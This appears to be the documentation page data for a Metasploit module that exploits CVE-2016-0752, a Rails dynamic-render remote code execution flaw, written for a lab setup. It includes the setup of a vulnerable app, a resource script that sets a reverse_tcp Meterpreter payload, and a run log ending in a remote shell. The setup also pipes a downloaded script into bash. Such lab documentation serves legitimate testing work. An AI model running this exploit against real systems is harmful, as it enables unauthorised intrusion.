{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/rails_dynamic_render_code_exec","result":{"data":{"moduleMetadataJson":{"id":"40051574-a869-5417-941f-fd6de831c62a","name":"Ruby on Rails Dynamic Render File Upload Remote Code Execution","fullname":"exploit/multi/http/rails_dynamic_render_code_exec","description":"This module exploits a remote code execution vulnerability in the explicit render\n        method when leveraging user parameters.\n        This module has been tested across multiple versions of Ruby on Rails.\n        The technique used by this module requires the specified\n        endpoint to be using dynamic render paths, such as the following example:\n\n        def show\n          render params[:id]\n        end\n\n        Also, the vulnerable target will need a POST endpoint for the TempFile upload, this\n        can literally be any endpoint. This module doesnt use the log inclusion method of\n        exploitation due to it not being universal enough. Instead, a new code injection\n        technique was found and used whereby an attacker can upload temporary image files\n        against any POST endpoint and use them for the inclusion attack. Finally, you only\n        get one shot at this if you are testing with the builtin rails server, use caution.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/rails_dynamic_render_code_exec","documentationSlug":"/modules/documentation/exploit/multi/http/rails_dynamic_render_code_exec"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>Rails is a web application development framework written in the Ruby language. It is designed to make programming web applications easier by making assumptions about what every developer needs to get started. It allows you to write less code while accomplishing more than many other languages and frameworks.</p>\n<p><a href=\"http://rubyonrails.org/\">http://rubyonrails.org/</a></p>\n<blockquote>\n<p>This module exploits the rendering vulnerability via a temporary file upload to pop a shell (CVE-2016-0752).</p>\n</blockquote>\n<h2 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h2>\n<p><strong>Download and setup the sample vuln application:</strong></p>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">sudo apt-get install -y curl git</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">curl -L https://get.rvm.io | bash -s stable --autolibs=3 --ruby=2.3.1</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">source ~/.rvm/scripts/rvm</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">sudo apt-get install rubygems ruby-dev nodejs zlib1g-dev -y</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">gem install rails -v 4.0.8</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">git clone https://github.com/forced-request/rails-rce-cve-2016-0752 pwn</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">cd pwn</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">bundle install</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Edit the config/routes.rb file and add <code class=\"language-text\">post &quot;users/:id&quot;, to: &#39;user#show&#39;</code></li>\n</ul>\n<p>Basically, you just need a POST endpoint for the temporary file upload trick. Now you can start the rails server and test the module.</p>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">rails s -b 0.0.0.0</code> or <code class=\"language-text\">rails s -b 0.0.0.0 -e production</code></li>\n</ul>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<h3 id=\"typical-usage\" style=\"position:relative;\"><a href=\"#typical-usage\" aria-label=\"typical usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Typical Usage</h3>\n<p>Just set <code class=\"language-text\">RHOST</code> and fire off the module! It's pretty much painless.\n<code class=\"language-text\">set VERBOSE true</code> if you want to see details.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">saturn:metasploit-framework mr_me$ cat scripts/rails.rc \nuse exploit/multi/http/rails_dynamic_render_code_exec\nset RHOST 172.16.175.251\nset payload linux/x86/meterpreter/reverse_tcp\nset LHOST 172.16.175.1\ncheck\nexploit\n\nsaturn:metasploit-framework mr_me$ ./msfconsole -qr scripts/rails.rc \n[*] Processing scripts/rails.rc for ERB directives.\nresource (scripts/rails.rc)&gt; use exploit/multi/http/rails_dynamic_render_code_exec\nresource (scripts/rails.rc)&gt; set RHOST 172.16.175.251\nRHOST =&gt; 172.16.175.251\nresource (scripts/rails.rc)&gt; set payload linux/x86/meterpreter/reverse_tcp\npayload =&gt; linux/x86/meterpreter/reverse_tcp\nresource (scripts/rails.rc)&gt; set LHOST 172.16.175.1\nLHOST =&gt; 172.16.175.1\nresource (scripts/rails.rc)&gt; check\n[+] 172.16.175.251:3000 The target is vulnerable.\nresource (scripts/rails.rc)&gt; exploit\n[*] Exploit running as background job.\n[*] Started reverse TCP handler on 172.16.175.1:4444 \n\n[*] Sending initial request to detect exploitability\nmsf exploit(rails_dynamic_render_code_exec) &gt; [*] 172.16.175.251:3000 - Starting up our web service on http://172.16.175.1:1337/iUDaRVpz ...\n[*] Using URL: http://0.0.0.0:1337/iUDaRVpz\n[*] Local IP: http://192.168.100.13:1337/iUDaRVpz\n[*] uploading image...\n[+] injected payload\n[*] 172.16.175.251:3000 - Sending the payload to the server...\n[*] Transmitting intermediate stager for over-sized stage...(105 bytes)\n[*] Sending stage (1495599 bytes) to 172.16.175.251\n[*] Meterpreter session 1 opened (172.16.175.1:4444 -&gt; 172.16.175.251:41246) at 2016-09-29 17:52:00 -0500\n[+] Deleted /tmp/NhhGKCCIgwF\n\nmsf exploit(rails_dynamic_render_code_exec) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; shell\nProcess 50809 created.\nChannel 1 created.\n$ id\nuid=1000(student) gid=1000(student) groups=1000(student),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)\n$</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"40051574-a869-5417-941f-fd6de831c62a"}}}